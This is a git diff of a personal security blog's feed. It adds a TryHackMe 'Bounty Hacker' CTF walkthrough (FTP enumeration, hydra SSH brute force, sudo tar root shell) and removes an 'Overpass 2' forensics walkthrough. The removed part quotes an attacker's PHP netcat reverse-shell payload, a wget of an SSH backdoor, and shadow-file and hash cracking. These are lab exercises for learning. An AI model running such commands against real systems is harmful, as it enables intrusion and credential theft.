@@ -1,4 +1,133 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-03-23T15:33:04+03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Mr0Wido’s Blog</title><subtitle>This is my personal website. The purpose of the Website is to assist and monitor my own development.</subtitle><author><name>Mr0Wido&apos;s Blog</name><email>furkn.dniz@gmail.com</email></author><entry><title type="html">TryHackMe - GamingServer</title><link href="http://localhost:4000/tryhackme-gamingserver/" rel="alternate" type="text/html" title="TryHackMe - GamingServer" /><published>2023-03-21T00:00:00+03:00</published><updated>2023-03-21T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-gamingserver</id><content type="html" xml:base="http://localhost:4000/tryhackme-gamingserver/"><![CDATA[<p>An Easy Boot2Root box for beginners. Let’s start.</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-03-23T17:09:41+03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Mr0Wido’s Blog</title><subtitle>This is my personal website. The purpose of the Website is to assist and monitor my own development.</subtitle><author><name>Mr0Wido&apos;s Blog</name><email>furkn.dniz@gmail.com</email></author><entry><title type="html">TryHackMe - Bounty Hacker</title><link href="http://localhost:4000/tryhackme-bounty-hacker/" rel="alternate" type="text/html" title="TryHackMe - Bounty Hacker" /><published>2023-03-23T00:00:00+03:00</published><updated>2023-03-23T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-bounty-hacker</id><content type="html" xml:base="http://localhost:4000/tryhackme-bounty-hacker/"><![CDATA[<p>You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker!.</p>
+
+<p>Let’s start.</p>
+
+<p><br /></p>
+
+<h2 id="1-living-up-to-the-title">1. Living up to the title.</h2>
+
+<p>You were boasting on and on about your elite hacker skills in the bar and a few Bounty Hunters decided they’d take you up on claims! Prove your status is more than just a few glasses at the bar. I sense bell peppers &amp; beef in your future!</p>
+
+<p><br /></p>
+
+<h3 id="11-deploy-the-machine">1.1 Deploy the machine.</h3>
+
+<h3 id="12-find-open-ports-on-the-machine">1.2 Find open ports on the machine</h3>
+
+<p>Let’s do a nmap scan first.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSCV 10.10.80.114
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/bounty-hacker/nmap.png" alt="nmap" /></p>
+
+<p>Three ports are open. These are <strong><code class="language-plaintext highlighter-rouge">21/tcp FTP, 22/tcp SSH, and 80/tcp HTTP</code></strong>.</p>
+
+<p>But first, let’s check the website running on port 80. 
+Here is a page like this.</p>
+
+<p><img src="/assets/img/tryhackme/bounty-hacker/home.png" alt="home" /></p>
+
+<p>I’ve been browsing this site  but haven’t found anything remarkable.</p>
+
+<p>We don’t have anything on website . Let’s run a gobuster scan and see what we can find. 
+I couldn’t find anything.</p>
+
+<h3 id="13-who-wrote-the-task-list">1.3 Who wrote the task list?</h3>
+
+<p>We see anonymous FTP login is allowed. So we login to the FTP server.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ftp anonymous@10.10.231.70
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/bounty-hacker/ftp.png" alt="ftp" /></p>
+
+<p>We see two files here. One of them is <strong><code class="language-plaintext highlighter-rouge">locks.txt</code></strong> and the other is <strong><code class="language-plaintext highlighter-rouge">task.txt</code></strong>. Let’s get this file on our machine.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ get locks.txt
+$ get task.txt
+</code></pre></div></div>
+
+<p>Let’s take a look at what is inside these files.</p>
+
+<p>locks.txt : This file is a password list.</p>
+
+<ul>
+  <li><img src="/assets/img/tryhackme/bounty-hacker/locks.png" alt="locks" /></li>
+</ul>
+
+<p>task.txt : This file is Lin’s notes.</p>
+
+<ul>
+  <li><img src="/assets/img/tryhackme/bounty-hacker/task.png" alt="task" /></li>
+</ul>
+
+<p>Now, we have a username and list of passwords that we can use to ssh brute force.</p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Answer: lin</code></strong></p>
+
+<p><br /></p>
+
+<h3 id="14-what-service-can-you-bruteforce-with-the-text-file-found">1.4 What service can you bruteforce with the text file found?</h3>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Answer: ssh</code></strong></p>
+
+<p><br /></p>
+
+<h3 id="15-what-is-the-users-password">1.5 What is the users password?</h3>
+
+<p>Let’s do ssh brute force.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ hydra -l lin -P locks.txt 10.10.231.70 -t 4 ssh
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/bounty-hacker/hydra.png" alt="hydra" /></p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Answer: RedDr4gonSynd1cat3</code></strong></p>
+
+<p><br /></p>
+
+<h3 id="16-usertxt">1.6 user.txt</h3>
+
+<p>We found Lin’s ssh password. Let’s login to ssh.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ssh lin@10.10.231.70
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/bounty-hacker/sshin.png" alt="sshin" /></p>
+
+<p>Now we can reach the user flag. Let’s get it.</p>
+
+<p><img src="/assets/img/tryhackme/bounty-hacker/user-flag.png" alt="user-flag" /></p>
+
+<p><br /></p>
+
+<h3 id="16-roottxt">1.6 root.txt</h3>
+
+<p>Now, we need privilege escalation. So, I try the first <strong><code class="language-plaintext highlighter-rouge">sudo -l</code></strong> command. I entered the password and here it is.</p>
+
+<p><img src="/assets/img/tryhackme/bounty-hacker/sudo.png" alt="sudo" /></p>
+
+<p>As far as I can see, we can get root privileges using tar. I’m looking at <a href="https://gtfobins.github.io/gtfobins/tar/">gtfobins</a>. and we found this.</p>
+
+<p><img src="/assets/img/tryhackme/bounty-hacker/gtfobins.png" alt="gtfobins" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh 
+</code></pre></div></div>
+
+<p>And we got root privilege. Now we can get to the root flag. Let’s get it.</p>
+
+<p><img src="/assets/img/tryhackme/bounty-hacker/root-flag.png" alt="root-flag" /></p>
+
+<p><br /></p>
+
+<hr />
+
+<p><br /></p>
+
+<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>
+
+<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>furkn.dniz@gmail.com</email></author><category term="TryHackMe" /><category term="linux," /><category term="tar," /><category term="privesc" /><summary type="html"><![CDATA[You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker!.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/bounty-hacker.jpeg" /><media:content medium="image" url="http://localhost:4000/assets/img/bounty-hacker.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - GamingServer</title><link href="http://localhost:4000/tryhackme-gamingserver/" rel="alternate" type="text/html" title="TryHackMe - GamingServer" /><published>2023-03-21T00:00:00+03:00</published><updated>2023-03-21T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-gamingserver</id><content type="html" xml:base="http://localhost:4000/tryhackme-gamingserver/"><![CDATA[<p>An Easy Boot2Root box for beginners. Let’s start.</p>
 
 <p><br /></p>
 
@@ -1662,213 +1791,4 @@ $ cat /root/root.txt
 
 <p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>
 
-<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>furkn.dniz@gmail.com</email></author><category term="TryHackMe" /><category term="security," /><category term="enumeration," /><category term="privesc" /><summary type="html"><![CDATA[This is an easy CTF. Let’s start.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/simple.png" /><media:content medium="image" url="http://localhost:4000/assets/img/simple.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Tryhackme - Overpass 2 - Hacked</title><link href="http://localhost:4000/tryhackme-overpass-2-hacked/" rel="alternate" type="text/html" title="Tryhackme - Overpass 2 - Hacked" /><published>2023-03-09T00:00:00+03:00</published><updated>2023-03-09T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-overpass-2-hacked</id><content type="html" xml:base="http://localhost:4000/tryhackme-overpass-2-hacked/"><![CDATA[<p>This was an easy Linux machine and the second in the Overpass TryHackMe series. It involved analyzing a capture file containing requests issued by an attacker to compromise the web server, escalate privileges to root and establish persistence, in order to understand the exact steps followed to do so, and then using that information to hack back into the host.</p>
-
-<p><br /></p>
-
-<hr />
-
-<p><br /></p>
-<h2 id="1-forensics---analyse-the-pcap">1. Forensics - Analyse the PCAP</h2>
-<p>Overpass has been hacked! The SOC team (Paradox, congratulations on the promotion) noticed suspicious activity on a late night shift while looking at shibes, and managed to capture packets as the attack happened.</p>
-
-<p>Can you work out how the attacker got in, and hack your way back into Overpass’ production server?</p>
-
-<p>Note: Although this room is a walkthrough, it expects familiarity with tools and Linux. I recommend learning basic Wireshark and completing Linux Fundamentals as a bare minimum.</p>
-
-<p><strong><code class="language-plaintext highlighter-rouge">md5sum of PCAP file: 11c3b2e9221865580295bc662c35c6dc</code></strong></p>
-
-<p><br /></p>
-<h3 id="11-what-was-the-url-of-the-page-they-used-to-upload-a-reverse-shell">1.1 What was the URL of the page they used to upload a reverse shell?</h3>
-
-<p>Open the <strong><code class="language-plaintext highlighter-rouge">overpass2.pcapng</code></strong> file in Wireshark and analyze the <strong><code class="language-plaintext highlighter-rouge">HTTP</code></strong> traffic (enter http as filter).</p>
-
-<p><img src="/assets/img/tryhackme/overpass-2/http.png" alt="http" /></p>
-
-<p>Right-click on the first http frame and select <strong><code class="language-plaintext highlighter-rouge">“Follow &gt; TCP Stream”</code></strong>. Here is the first request.</p>
-
-<p><img src="/assets/img/tryhackme/overpass-2/tcp.png" alt="tcp" /></p>
-
-<p><strong>Answer : <code class="language-plaintext highlighter-rouge">/development/</code></strong></p>
-
-<p><br /></p>
-<h3 id="12-what-payload-did-the-attacker-use-to-gain-access">1.2 What payload did the attacker use to gain access?</h3>
-<p>Now, we are trying to find the reverse shell that the attacker has uploaded to the system. So we apply this filter.</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$http.request.method == "POST"
-</code></pre></div></div>
-<p>And here it is,</p>
-
-<p><img src="/assets/img/tryhackme/overpass-2/post.png" alt="post" /></p>
-
-<p>Right-click on the HTTP frame and select <strong><code class="language-plaintext highlighter-rouge">“Follow &gt; TCP Stream”</code></strong>.</p>
-
-<p><img src="/assets/img/tryhackme/overpass-2/payload.png" alt="payload" /></p>
-
-<p>Answer : <code class="language-plaintext highlighter-rouge">&lt;?php exec\(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.170.145 4242 &gt;/tmp/f\")?&gt;</code></p>
-
-<p><br /></p>
-<h3 id="13-what-password-did-the-attacker-use-to-privesc">1.3 What password did the attacker use to privesc?</h3>
-<p>Now, <strong><code class="language-plaintext highlighter-rouge">CTRL+F</code></strong> to search. After that, we set the <strong><code class="language-plaintext highlighter-rouge">string</code></strong> and searching for requests containing <strong><code class="language-plaintext highlighter-rouge">passwords</code></strong>.</p>
-
-<p><img src="/assets/img/tryhackme/overpass-2/string.png" alt="string" /></p>
-
-<p>Now, requests that contain passwords from this search will appear marked.</p>
-
-<p><img src="/assets/img/tryhackme/overpass-2/marked.png" alt="mark" /></p>
-
-<p>We look at the TCP Stream and we have james’ password.</p>
-
-<p><img src="/assets/img/tryhackme/overpass-2/password.png" alt="password" /></p>
-
-<p><strong>Answer: <code class="language-plaintext highlighter-rouge">whenevernoteartinstant</code></strong></p>
-
-<p><br /></p>
-<h3 id="14-how-did-the-attacker-establish-persistence">1.4 How did the attacker establish persistence?</h3>
-<p>Still in the same stream, scrolling down reveals that the attacker has downloaded an ssh backdoor to establish persistence.</p>
-
-<p><img src="/assets/img/tryhackme/overpass-2/git.png" alt="git" /></p>
-
-<p><strong>Answer: <code class="language-plaintext highlighter-rouge">https://github.com/NinjaJc01/ssh-backdoor</code></strong></p>
-
-<p><br /></p>
-<h3 id="15-using-the-fasttrack-wordlist-how-many-of-the-system-passwords-were-crackable">1.5 Using the fasttrack wordlist, how many of the system passwords were crackable?</h3>
-<p>In the same stream, the attacker dumped the content of the <strong><code class="language-plaintext highlighter-rouge">/etc/shadow</code></strong> file just before downloading the SSH backdoor.</p>
-
-<p><img src="/assets/img/tryhackme/overpass-2/hosts.png" alt="hosts" /></p>
-
-<p>Save the content in a file and crack it with <strong><code class="language-plaintext highlighter-rouge">John</code></strong> against the <strong><code class="language-plaintext highlighter-rouge">fasttrack</code></strong> wordlist to confirm how many passwords are crackable.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ john --wordlist=/usr/share/wordlist/fasttrack.txt shadow.txt
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/overpass-2/shadow.png" alt="shadow" /></p>
-
-<p><strong>Answer: <code class="language-plaintext highlighter-rouge">4</code></strong></p>
-
-<p><br /></p>
-
-<hr />
-
-<p><br /></p>
-
-<h2 id="2-research---analyse-the-code">2. Research - Analyse the Code</h2>
-<p>Now that you’ve found the code for the backdoor, it’s time to analyse it.
-<br /></p>
-<h3 id="21-whats-the-default-hash-for-the-backdoor">2.1 What’s the default hash for the backdoor?</h3>
-
-<p>Still, in the same stream, we see that the attacker executes the backdoor with the <code class="language-plaintext highlighter-rouge">-a</code> option, along with a <code class="language-plaintext highlighter-rouge">hash</code>.</p>
-
-<p><img src="/assets/img/tryhackme/overpass-2/back.png" alt="back" /></p>
-
-<p>What does the -a option do? Let’s download the backdoor locally and check ourselves what this option is.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ wget https://github.com/NinjaJc01/ssh-backdoor/raw/master/backdoor
-$ chmod +x backdoor 
-$ ./backdoor -h
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/overpass-2/door.png" alt="door" /></p>
-
-<p>As you can see here, if no hash is entered in the -a option, the tool itself uses a default hash.</p>
-
-<p><strong>Answer: <code class="language-plaintext highlighter-rouge">bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3</code></strong></p>
-
-<p><br /></p>
-<h3 id="22-whats-the-hardcoded-salt-for-the-backdoor">2.2 What’s the hardcoded salt for the backdoor?</h3>
-<p>Reading the source code of the backdoor <a href="https://github.com/NinjaJc01/ssh-backdoor/blob/master/main.go">https://github.com/NinjaJc01/ssh-backdoor/blob/master/main.go</a>, reveals that the salt is hardcoded.</p>
-
-<p><img src="/assets/img/tryhackme/overpass-2/salt.png" alt="salt" /></p>
-
-<p><strong>Answer: <code class="language-plaintext highlighter-rouge">1c362db832f3f864c8c2fe05f2002a05</code></strong></p>
-
-<p><br /></p>
-<h3 id="23-what-was-the-hash-that-the-attacker-used---go-back-to-the-pcap-for-this">2.3 What was the hash that the attacker used? - Go back to the PCAP for this!</h3>
-<p>We saw previously that the attacker used a custom hash.</p>
-
-<p><img src="/assets/img/tryhackme/overpass-2/door.png" alt="door" /></p>
-
-<p><strong>Answer: <code class="language-plaintext highlighter-rouge">6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed</code></strong></p>
-
-<p><br /></p>
-<h3 id="24-crack-the-hash-using-rockyou-and-a-cracking-tool-of-your-choice-whats-the-password">2.4 Crack the hash using rockyou and a cracking tool of your choice. What’s the password?</h3>
-
-<p>Analyzing the source code, we can see that the password is salted as follows.</p>
-
-<p><img src="/assets/img/tryhackme/overpass-2/sha.png" alt="sha" /></p>
-
-<p>The salt is appended to the password, and SHA512 of the resulting string makes the hash.
-We create hash.txt and paste the following into it.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed$1c362db832f3f864c8c2fe05f2002a05
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/overpass-2/cat.png" alt="cat" /></p>
-
-<p>Now, let’s crack it with john. As a format, we use <code class="language-plaintext highlighter-rouge">(sha512($pass.$salt))</code>.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ john --format='dynamic=sha512($p.$s)' --wordlist=/usr/share/wordlists/rockyou.txt  hash.txt
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/overpass-2/hash.png" alt="hash" /></p>
-
-<p><strong>Answer: <code class="language-plaintext highlighter-rouge">november16</code></strong></p>
-
-<p><br /></p>
-
-<hr />
-
-<p><br /></p>
-
-<h2 id="3-attack---get-back-in">3. Attack - Get back in!</h2>
-<p>Now that the incident is investigated, Paradox needs someone to take control of the Overpass production server again.</p>
-
-<p>There’s flags on the box that Overpass can’t afford to lose by formatting the server!</p>
-
-<p><br /></p>
-<h3 id="31-the-attacker-defaced-the-website-what-message-did-they-leave-as-a-heading">3.1 The attacker defaced the website. What message did they leave as a heading?</h3>
-<p>Let’s do an nmap scan.</p>
-
-<p><img src="/assets/img/tryhackme/overpass-2/nmap.png" alt="nmap" /></p>
-
-<p>As we see here, 3 ports are open. One is <strong><code class="language-plaintext highlighter-rouge">HTTP:80</code></strong> and the others are <strong><code class="language-plaintext highlighter-rouge">SSH:22</code></strong>, <strong><code class="language-plaintext highlighter-rouge">SSH:2222</code></strong>.
-Connect to port 80. The index page shows the following message.</p>
-
-<p><img src="/assets/img/tryhackme/overpass-2/message.png" alt="message" /></p>
-
-<p><strong>Answer: <code class="language-plaintext highlighter-rouge">H4ck3d by CooctusClan</code></strong></p>
-
-<p><br /></p>
-<h3 id="32-using-the-information-youve-found-previously-hack-your-way-back-in">3.2 Using the information you’ve found previously, hack your way back in!</h3>
-<p>It appears port 2222 is open. Logging in with the password cracked earlier. (november 16)</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ssh 10.10.128.157 -p 2222 -oHostKeyAlgorithms=+ssh-rsa
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/overpass-2/ssh.png" alt="ssh" /></p>
-
-<p><br /></p>
-<h3 id="33-whats-the-user-flag">3.3 What’s the user flag?</h3>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat /home/james/user.txt
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/overpass-2/user.png" alt="user" /></p>
-
-<p><br /></p>
-<h3 id="34-whats-the-root-flag">3.4 What’s the root flag?</h3>
-<p>There is a copy of bash in James’s home directory.</p>
-
-<p><img src="/assets/img/tryhackme/overpass-2/bash.png" alt="bash" /></p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./.suid_bash -p 
-$ cat /root/root.txt
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/overpass-2/root.png" alt="root" /></p>
-
-<p><img src="/assets/img/tryhackme/overpass-2/root-flag.png" alt="root-flag" /></p>
-
-<p><br /></p>
-
-<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>
-
-<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>furkn.dniz@gmail.com</email></author><category term="TryHackMe" /><category term="security," /><category term="forensics," /><category term="wireshark" /><summary type="html"><![CDATA[This was an easy Linux machine and the second in the Overpass TryHackMe series. It involved analyzing a capture file containing requests issued by an attacker to compromise the web server, escalate privileges to root and establish persistence, in order to understand the exact steps followed to do so, and then using that information to hack back into the host.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/overpass-2.png" /><media:content medium="image" url="http://localhost:4000/assets/img/overpass-2.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
+<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>furkn.dniz@gmail.com</email></author><category term="TryHackMe" /><category term="security," /><category term="enumeration," /><category term="privesc" /><summary type="html"><![CDATA[This is an easy CTF. Let’s start.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/simple.png" /><media:content medium="image" url="http://localhost:4000/assets/img/simple.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
